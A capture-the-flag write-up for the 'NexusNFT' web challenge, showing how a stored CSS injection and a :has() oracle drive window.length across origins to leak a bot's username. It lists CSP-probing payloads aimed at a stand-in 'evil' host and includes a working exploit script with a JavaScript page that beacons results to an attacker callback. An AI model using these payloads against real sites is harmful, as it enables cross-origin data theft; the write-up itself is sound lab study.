@@ -1,0 +1,346 @@
+---
+title: '07CTF 2026 - NexusNFT'
+description: 'Reading a bot username through a CSS :has() oracle that drives window.length across origins, under a CSP with no subresource holes and COOP disabled on plain http'
+date: 2026-09-20
+tags: ['writeup', 'web', 'xs-leaks', 'csp-bypass', 'css-injection', 'coop-bypass', '07ctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A stored HTML/CSS injection behind a CSP that blocks *every* outbound subresource, with no JavaScript execution available anywhere on the origin. The leak ends up going through `window.length` — an integer — one character per admin-bot visit.
+
+## Challenge Description
+
+> 2022 was a crazy year, which saw paitings of monkeys being sold for millions. I also made an NFT marketplace that year, but turns out, I didn't secure it enough.
+
+The handout is a Flask app, a Puppeteer admin bot, and an nginx config gluing them together.
+
+## Where the flag lives
+
+`app/main.py` builds its user table like this:
+
+```python
+FLAG = os.environ.get("FLAG", "flag{not_set}")
+
+users = {
+    "admin": {
+        "password": os.environ.get("ADMIN_PASSWORD", "report_to_admin_if_this_works"),
+        "name": "admin", "role": "admin", "is_seller": True,
+        "cart": [], "balance": 999999999,
+    },
+    FLAG: {
+        "password": FLAG, "name": FLAG, "role": "user", "is_seller": False,
+        "cart": [], "balance": 1000,
+    },
+}
+```
+
+**The flag is a username.** And `bot/server.js` logs in as exactly that account:
+
+```js
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME || process.env.FLAG;
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || process.env.FLAG;
+```
+
+`supervisord.conf` passes only `FLAG` to the bot, so both fall through to the flag. That matters twice over. First, it tells us what to steal. Second, it means **`ADMIN_PASSWORD` can never be set in a working deployment**. If it were, the bot would try `username=FLAG` with `password=ADMIN_PASSWORD`, which is not that user's password, and every bot visit would fail at login. The default `report_to_admin_if_this_works` is therefore guaranteed live, however much the string protests.
+
+Once the bot is logged in, `templates/base.html` renders the flag into every page it loads:
+
+```html
+<span class="user-greeting" data-username="{{ session.username }}">{{ session.username }}</span>
+```
+
+A `data-` attribute is a deliberate invitation: attribute values are the one thing CSS selectors can match on. So the intended read is a CSS attribute-selector oracle. The interesting half of this challenge is getting a single bit of that oracle back out.
+
+## Getting a stored injection
+
+`admin` has `is_seller: True`, which unlocks `/create-product`, and `templates/product.html` renders a product description **unescaped**:
+
+```jinja
+{{ product.description | safe }}
+```
+
+`/product/<id>` needs no login, so the bot can be sent straight to it, and it extends `base.html` — meaning our injected markup sits on the same page as the bot's `data-username`. That is the whole primitive:
+
+```text
+admin / report_to_admin_if_this_works
+  -> POST /create-product  (description = payload)
+  -> bot visits /product/<id>  ->  payload runs next to data-username="07CTF{...}"
+```
+
+## The wall: a CSP with no holes
+
+Every Flask response goes through:
+
+```python
+@app.after_request
+def add_security_headers(response):
+    response.headers['Content-Security-Policy'] = \
+        "default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self';"
+    response.headers['Cross-Origin-Opener-Policy'] = "same-origin"
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['Referrer-Policy'] = 'no-referrer'
+```
+
+`style-src 'unsafe-inline'` is the gift. Everything else is a wall. I drove a CDP-instrumented Chrome with the bot's exact flags and fired one payload containing every outbound channel I could think of. Verbatim verdicts:
+
+| Attempt | Result |
+|---|---|
+| `<img src=http://evil/>` | `violates ... "default-src 'self'"` |
+| `<style>background-image:url(http://evil/)</style>` | `violates ... "default-src 'self'"` |
+| `<link rel=stylesheet href=http://evil/>` | `violates ... "style-src"` |
+| `<link rel=prefetch href=http://evil/>` | `violates ... "default-src 'self'"` |
+| `<script src=http://evil/>` | `violates ... "script-src 'self'"` |
+| `<script>fetch(...)</script>` | `Executing inline script violates ... 'script-src 'self''` |
+| `<iframe src=http://evil/>` | `Framing ... violates ... "default-src 'self'"` |
+| `<object data=http://evil/>` | `Loading plugin data ... violates ... "default-src 'self'"` |
+| `<video poster=http://evil/>` | `violates ... "default-src 'self'"` |
+
+Three channels *did* escape, all confirmed against a DNS logger and a raw-TCP logger:
+
+- `<link rel="dns-prefetch">` — DNS query fired. CSP does not govern it.
+- `<link rel="preconnect">` — DNS query **and** a real TCP connection to an arbitrary `host:port`.
+- `<meta http-equiv="refresh">` to an external origin — navigation is not CSP-governed.
+
+All three are useless on their own: they are HTML elements that fire unconditionally at parse time. CSS cannot gate them, so they carry no information about the flag. And a CSP-blocked CSS URL produces **no** DNS and **no** TCP — I checked specifically, in case Chrome's preload scanner resolved hostnames before the CSP check. It does not.
+
+### No JavaScript, anywhere
+
+`script-src 'self'` allows same-origin scripts, so the real question is whether any same-origin URL returns attacker-controlled bytes that Chrome will execute. I mapped every response on the origin for content-type, `nosniff`, CSP, `X-Frame-Options`, and whether it reflects input:
+
+```text
+/bot/                ct=text/html         nosniff=no  csp=no  xfo=no  reflects=no
+/bot/api/status      ct=application/json  nosniff=no  csp=no  xfo=no  reflects=no
+/bot/health          ct=application/json  nosniff=no  csp=no  xfo=no  reflects=no
+/bot/<404>           ct=text/html         nosniff=YES csp=YES xfo=no  reflects=YES
+/note?content=X      ct=text/html         nosniff=YES csp=YES xfo=YES reflects=YES
+/flag  (nginx 404)   ct=text/html         nosniff=no  csp=no  xfo=no  reflects=no
+/static/js/main.js   ct=text/javascript   nosniff=YES csp=YES xfo=YES reflects=no
+/  /product/<id>     ct=text/html         nosniff=YES csp=YES xfo=YES reflects=no
+```
+
+Read that table as a single sentence: **the only responses without `nosniff` are the bot server's, and none of them reflect input; the only responses that reflect input have `nosniff` and are `text/html`.** The two sets do not intersect.
+
+The no-`nosniff` half is not theoretical — `<script src="/bot/api/status">` genuinely *executes*, it just happens to be JSON:
+
+```text
+REQ  script  http://nft-app/bot/api/status
+ERR  SyntaxError: Unexpected token ':'
+```
+
+A `SyntaxError` means Chrome ran it. With controllable bytes there it would be game over. The express 404 does echo the path, but it URL-encodes it *and* ships `Content-Security-Policy: default-src 'none'` plus `nosniff`. There is no open redirect either, which would otherwise have bypassed `script-src` outright, since CSP does not re-check redirect targets.
+
+So: **CSS injection, and nothing else.**
+
+### Nothing the bot touches is readable
+
+The obvious fallback is to have the bot write the flag into server state we can read. `create_product` stores `seller = session['username']` and `/product/<id>` renders `{{ seller_name }}` publicly — perfect, except it needs `is_seller`, and the flag user has `is_seller: False`. Every other write is POST-only and lands in state only that user can read; CSS can only issue GETs. Timing is out too: `page.goto(url, {waitUntil: 'domcontentloaded'})` plus a fixed `setTimeout` dwell means the visit duration is constant, and CSS cannot delay `DOMContentLoaded`.
+
+At this point every channel I could name was dead. The way through turned out to be three smaller mistakes that are individually harmless.
+
+## Flaw 1 — the bot server shares the app's origin
+
+```nginx
+location /bot/ {
+    proxy_pass http://127.0.0.1:3000/;
+}
+location / {
+    proxy_pass http://127.0.0.1:5002;
+}
+```
+
+The admin-bot UI is served from the *same origin* as the app. It is Express, so unlike every Flask response it carries **no `X-Frame-Options`**. The app's own `frame-src` falls back to `default-src 'self'`, so a same-origin nested browsing context is allowed by CSP — and nothing else refuses it:
+
+```text
+<iframe src="/dashboard">   ->  Refused to display ... 'X-Frame-Options' to 'deny'
+<iframe src="/bot/">        ->  loads
+<object data="/bot/">       ->  loads
+<object data="/dashboard">  ->  blocked
+```
+
+## Flaw 2 — an `<object>` only counts when it loads
+
+`window.length` is the number of child browsing contexts. An `<iframe>` creates one the moment the element is parsed, loaded or not — a `loading="lazy"` iframe parked 50,000px below the fold still counts. An **`<object>` does not**: it only creates a browsing context if its resource actually loads, otherwise it falls back to its children. And CSS decides whether it loads:
+
+```text
+baseline (visible)                    window.length=4
+object{display:none}                  window.length=0     <-- suppressed
+object{visibility:hidden}             window.length=4
+object{content-visibility:hidden}     window.length=4
+parent{display:none}                  window.length=0
+```
+
+Only `display:none` works, which is exactly what `:has()` can drive. That converts an attribute-selector match into an integer:
+
+```css
+object { display: none }
+body:has([data-username^="07CTF{c"]) object { display: inline-block }
+```
+
+```text
+prefix="07CTF{"   window.length=0     (matched -> hidden)
+prefix="zzzzzz"   window.length=4     (no match -> visible)
+```
+
+The `<object>` target has to be picked with care — it must be same-origin, XFO-free, **and** return something that forms a document. `/bot/health` is the cheapest: a 20-byte same-origin JSON response.
+
+## Flaw 3 — the cookie leaks to port 80, and http kills COOP
+
+An integer is only useful if we can read it, and `Cross-Origin-Opener-Policy: same-origin` is supposed to sever the opener handle the moment we `window.open()` the product page. The session cookie is set without `Secure` and without `SameSite`:
+
+```text
+Set-Cookie: session=...; HttpOnly; Path=/
+```
+
+Cookies are scoped by host, not by origin — no port, and no scheme without `Secure`. The bot logs in at `https://nft-app:5000`, but the cookie is therefore *also* sent to `http://nft-app/` on port 80, which nginx serves as `default_server`:
+
+```text
+http://nft-app/dashboard  ->  data-username = 07ctf{l0c4l_t3st_fl4g_d4t4_us3rn4m3}
+```
+
+And over plain http, Chrome throws the COOP header away:
+
+```text
+The Cross-Origin-Opener-Policy header has been ignored,
+because the URL's origin was untrustworthy.
+```
+
+So on port 80 the opener survives, and `window.length` stays readable cross-origin. Port 80 also happens to be where `/bot/` lives, which flaw 1 needs. One URL satisfies all three conditions at once. Popups are not blocked in the bot's headless Chrome, so from an attacker page:
+
+```js
+const w = window.open('http://nft-app/product/<id>');
+setTimeout(() => new Image().src = '/report?n=' + w.length, 5000);
+```
+
+The bot dwells 20s on any URL whose origin differs from `APP_URL`, which is ample.
+
+## Encoding: one character per visit
+
+A single bit per visit would be ~7 visits per character. Instead, size the `<object>` groups as powers of two and make `window.length` *be* the charset index. Groups `g0..g6` hold 1, 2, 4, 8, 16, 32 and 64 objects. For candidate `i`, reveal the groups matching the set bits of `i+1`, so a match reads back as `i+1` and "no match at all" reads back as `0`:
+
+```python
+rules = ["object{display:none}"]
+for i, ch in enumerate(CHARSET):
+    sel = '[data-username^="%s"]' % (prefix + ch)
+    for j in range(7):
+        if (i + 1) >> j & 1:
+            rules.append("body:has(%s) .g%d{display:inline-block}" % (sel, j))
+```
+
+Prefixes are mutually exclusive, so at most one candidate ever matches. ~23 KB of CSS and 127 `<object>`s per product, all same-origin. **One bot visit per character.**
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+import hashlib, http.server, json, os, re, socketserver, threading, time
+import urllib.parse, urllib.request, http.cookiejar
+
+BASE     = os.environ.get("BASE", "http://127.0.0.1:8081")
+APP_HOST = os.environ.get("APP_HOST", "http://nft-app")   # port 80, plain http -- required
+CALLBACK = os.environ.get("CALLBACK", "http://172.17.0.1:9011")
+LISTEN   = ("0.0.0.0", int(os.environ.get("PORT", "9011")))
+PREFIX   = os.environ.get("PREFIX", "07CTF{")
+ADMIN_PW = "report_to_admin_if_this_works"
+CHARSET  = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            "0123456789_{}-!?.@#$%^&*+=:;,/")
+OBJ, NBITS = "/bot/health", 7
+
+
+def admin_session():
+    cj = http.cookiejar.CookieJar()
+    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+    op.open(BASE + "/login", urllib.parse.urlencode(
+        {"username": "admin", "password": ADMIN_PW}).encode()).read()
+    return op
+
+
+def create_product(op, description):
+    body = op.open(BASE + "/create-product", urllib.parse.urlencode({
+        "title": "x", "description": description, "price": "1",
+        "image_url": "/static/images/default_nft.png",
+        "category": "art"}).encode()).read().decode()
+    return re.search(r"/product/([0-9a-f-]{36})", body).group(1)
+
+
+def bot_visit(url):
+    c = api("/bot/api/challenge")
+    ch, target, n = c["challenge"], "0" * c["difficulty"], 0
+    while not hashlib.sha256((ch + str(n)).encode()).hexdigest().startswith(target):
+        n += 1
+    return api("/bot/api/submit", {"url": url, "challenge": ch, "nonce": n})
+
+
+def payload(prefix):
+    """window.length == index of the next character in CHARSET, plus one."""
+    rules = ["object{display:none}"]
+    for i, ch in enumerate(CHARSET):
+        sel = '[data-username^="%s"]' % (prefix + ch).replace("\\", "\\\\").replace('"', '\\"')
+        for j in range(NBITS):
+            if (i + 1) >> j & 1:
+                rules.append("body:has(%s) .g%d{display:inline-block}" % (sel, j))
+    objs = "".join('<object class="g%d" data="%s" width=1 height=1></object>' % (j, OBJ)
+                   for j in range(NBITS) for _ in range(1 << j))
+    return "<style>%s</style>%s" % ("".join(rules), objs)
+
+
+LEAK_PAGE = """<!doctype html><meta charset=utf-8><script>
+const pid = new URLSearchParams(location.search).get('pid');
+const w = window.open('%s/product/' + pid, 'leak');
+setTimeout(() => {
+  let n = -1;
+  try { n = w.length; } catch (e) {}
+  try { w.close(); } catch (e) {}
+  new Image().src = '/report?n=' + n;
+}, 5000);
+</script>""" % APP_HOST
+```
+
+The full driver logs in as `admin` with the default password, plants one product per character, submits `CALLBACK/leak?pid=<id>` to the bot, and advances `known` by `CHARSET[n - 1]` each time the callback reports a non-zero `window.length`.
+
+## Running it
+
+Locally, against a container built from the handout with a *randomised* `secret_key` so the `/flag` path could not be a shortcut:
+
+```text
+$ docker run -d --name nft -p 8081:80 -e FLAG='07ctf{l0c4l_t3st_fl4g_d4t4_us3rn4m3}' nexusnft-local
+$ python3 exploit.py
+[+] logged in as admin (default password) -> seller access
+    07ctf{l
+    07ctf{l0
+    07ctf{l0c
+    ...
+    07ctf{l0c4l_t3st_fl4g_d4t4_us3rn4m3}
+```
+
+Then against the live instance:
+
+```text
+$ BASE=http://bfe5b19d38.ctf.bg2.in \
+  APP_HOST=http://nft-app \
+  CALLBACK=https://<quick-tunnel>.trycloudflare.com \
+  python3 exploit.py
+[+] logged in as admin (default password) -> seller access
+    07CTF{c
+    07CTF{cr
+    07CTF{cra
+    07CTF{cras
+    07CTF{crasH
+    07CTF{crasH3
+    07CTF{crasH3d
+    07CTF{crasH3dd
+    07CTF{crasH3ddD
+    07CTF{crasH3ddDX
+    07CTF{crasH3ddDX}
+
+[+] FLAG: 07CTF{crasH3ddDX}
+```
+
+Confirmed independently — the flag is the account's password too, so `POST /login` with `username = password = 07CTF{crasH3ddDX}` returns `302 /dashboard`, and a single wrong byte would 404 the user lookup. Two operational notes: `APP_HOST` must stay `http://nft-app` (that hostname only resolves inside the bot's browser, the cookie is host-scoped to it, and it is plain http regardless of the public exposure — which is what keeps COOP disabled); and the bot drops roughly half of its visits, because `bot/server.js` calls `page.click()` and *then* `await page.waitForNavigation()`, so a fast response completes navigation before the listener attaches. The solver polls `/bot/api/status` and resubmits on idle.
+
+## Flag
+
+```text
+07CTF{crasH3ddDX}
+```
